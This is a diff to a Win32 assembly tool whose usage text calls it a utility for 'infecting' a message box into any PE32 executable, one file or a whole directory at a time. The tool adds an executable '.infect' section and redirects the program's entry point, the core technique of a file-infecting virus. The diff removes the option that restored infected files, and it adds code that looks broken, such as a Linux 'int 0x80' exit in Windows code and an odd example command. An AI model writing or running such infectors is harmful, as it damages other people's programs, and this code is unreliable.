@@ -21,14 +21,11 @@
   .data 
     fileArg db "-f", 0
     directoryArg db "-d", 0
-    recoverArg db "-r", 0
-    doRecover db 0
     usageMsg db "A simple utility for infecting Message Box into any PE32 EXE file", 0
-    exampleMsg db "Example: -f <file.exe> -r", 0
+    exampleMsg db "Example: -f <file.exe> -f", 0
     usageDesc db "Usage Description", 0
     fileDesc db "-f Infect Message Box into only one file", 0
     dirDesc db "-d Infect Message Box into one directory", 0
-    recoverDesc db "-r Recover file to original state", 0
 
   .code
   
@@ -75,13 +72,20 @@ GetThirdArg PROC
   ret
 
 _error:
-  ; Handle error
+  mov edx, OFFSET errorMsg
+  call WriteConsole
+
+  ; Exit the program
+  mov eax, 1
+  int 0x80
+
+errorMsg db "An error occurred", 0
   ret
 GetThirdArg ENDP
 
-align PROC size:DWORD, alignment:DWORD, address:DWORD
+GetAlign PROC sizeOfSection:DWORD, alignment:DWORD, address:DWORD
     ; Calculate size % alignment
-    mov eax, size
+    mov eax, sizeOfSection
     xor edx, edx
     div alignment
 
@@ -98,7 +102,7 @@ align PROC size:DWORD, alignment:DWORD, address:DWORD
 _return_address_plus_size:
     add eax, address
     ret
-align ENDP
+GetAlign ENDP
 
 GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
   LOCAL first:DWORD
@@ -129,114 +133,6 @@ GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
   mov eax, originEntryPoint
   ret
 GetEntryPoint ENDP
-
-RecoverFile PROC fileName:DWORD
-  LOCAL hFile:DWORD
-  LOCAL hMap:DWORD
-  LOCAL lpBase:DWORD
-  LOCAL byteWritten:DWORD
-  LOCAL fileSize:DWORD
-  LOCAL pByte:DWORD
-  LOCAL pDosHeader:DWORD
-  LOCAL pNtHeader:DWORD
-  LOCAL entryPoint:DWORD
-  LOCAL section:DWORD
-  LOCAL lastSection:DWORD
-  LOCAL i:DWORD
-
-  ; Load file
-  invoke CreateFile, fileName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
-  mov hFile, eax
-  cmp eax, INVALID_HANDLE_VALUE
-  je _exit
-
-  ; Map file into memory
-  invoke CreateFileMapping, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
-  mov hMap, eax
-  cmp eax, NULL
-  je _exit
-
-  invoke MapViewOfFile, hMap, FILE_MAP_ALL_ACCESS, 0, 0, 0
-  mov lpBase, eax
-  cmp eax, NULL
-  je _exit
-
-  ; Set some variable
-  invoke GetFileSize, hFile, NULL
-  mov fileSize, eax
-
-  invoke GlobalAlloc, GMEM_FIXED, fileSize
-  mov pByte, eax
-  cmp eax, NULL
-  je _exit
-
-  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
-  cmp byteWritten, fileSize
-  jne _exit
-
-  ; Get header of file
-  mov pDosHeader, pByte
-  cmp [pDosHeader + IMAGE_DOS_HEADER.e_magic], IMAGE_DOS_SIGNATURE
-  jne _exit
-
-  add pByte, [pDosHeader + IMAGE_DOS_HEADER.e_lfanew]
-  mov pNtHeader, pByte
-  cmp [pNtHeader + IMAGE_NT_HEADERS.Signature], IMAGE_NT_SIGNATURE
-  jne _exit
-
-  ; Get address of section
-  invoke GetEntryPoint, pNtHeader, pByte
-  mov entryPoint, eax
-
-  mov eax, pNtHeader
-  add eax, SIZEOF IMAGE_NT_HEADERS
-  mov section, eax
-
-  mov ecx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
-  dec ecx
-  lea eax, [section + ecx * SIZEOF IMAGE_SECTION_HEADER]
-  mov lastSection, eax
-
-  sub entryPoint, [pNtHeader + IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
-  mov [pNtHeader + IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint], entryPoint
-
-  invoke SetFilePointer, hFile, 0, NULL, FILE_BEGIN
-  invoke UnmapViewOfFile, lpBase
-  invoke CloseHandle, hMap
-  invoke WriteFile, hFile, pByte, fileSize, addr byteWritten, NULL
-
-  invoke SetFilePointer, hFile, 0, NULL, FILE_BEGIN
-  mov ecx, [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
-  mov i, 0
-  _loop:
-      cmp i, ecx
-      jge _endLoop
-      lea eax, [section + i * SIZEOF IMAGE_SECTION_HEADER]
-      invoke lstrcmp, addr [eax + IMAGE_SECTION_HEADER.Name], addr ".infect"
-      jne _next
-      lea ebx, [eax + SIZEOF IMAGE_SECTION_HEADER]
-      lea ecx, [section + ecx * SIZEOF IMAGE_SECTION_HEADER]
-      sub ecx, ebx
-      invoke RtlMoveMemory, eax, ebx, ecx
-      dec dword ptr [pNtHeader + IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
-      sub dword ptr [pNtHeader + IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage], SIZEOF IMAGE_SECTION_HEADER
-      sub dword ptr [pNtHeader + IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders], SIZEOF IMAGE_SECTION_HEADER
-      jmp _endLoop
-  _next:
-      inc i
-      jmp _loop
-  _endLoop:
-
-  invoke SetEndOfFile, hFile
-  invoke WriteFile, hFile, pByte, fileSize, addr byteWritten, NULL
-  invoke CloseHandle, hFile
-
-  mov eax, TRUE
-  ret
-_exit:
-  mov eax, FALSE
-  ret
-RecoverFile ENDP
 
 OpenFile proc fileName:DWORD
   LOCAL hFile:DWORD
@@ -357,13 +253,13 @@ _checkSection:
   mov [eax], esi
 
   ; Set the section attributes
-  invoke align, sizeOfSection, [pNtHeader + 56], 0
+  invoke GetAlign, sizeOfSection, [pNtHeader + 56], 0
   mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
-  invoke align, [ebx + (ecx - 1) * 40 + 8], [pNtHeader + 56], [ebx + (ecx - 1) * 40 + 12]
+  invoke GetAlign, [ebx + (ecx - 1) * 40 + 8], [pNtHeader + 56], [ebx + (ecx - 1) * 40 + 12]
   mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
-  invoke align, sizeOfSection, [pNtHeader + 60], 0
+  invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
   mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
-  invoke align, [ebx + (ecx - 1) * 40 + 16], [pNtHeader + 60], [ebx + (ecx - 1) * 40 + 20]
+  invoke GetAlign, [ebx + (ecx - 1) * 40 + 16], [pNtHeader + 60], [ebx + (ecx - 1) * 40 + 20]
   mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
   mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER
 
@@ -631,9 +527,6 @@ main proc
   jl _printUsage
 
   ; Check for "-r" argument
-  invoke InString, 1, cmdline, offset recoverArg
-  cmp eax, 0
-  jne _setRecover
 
   invoke InString, 1, cmdline, offset fileArg
   cmp eax, 0
@@ -649,14 +542,8 @@ _printUsage:
   print offset usageDesc
   print offset fileDesc
   print offset dirDesc
-  print offset recoverDesc
   jmp _exit
 
-_setRecover:
-  invoke GetThirdArg , cmdline
-  push eax
-  call RecoverFile
-  add esp, 4  
 
 _openFile:
   invoke OpenFile
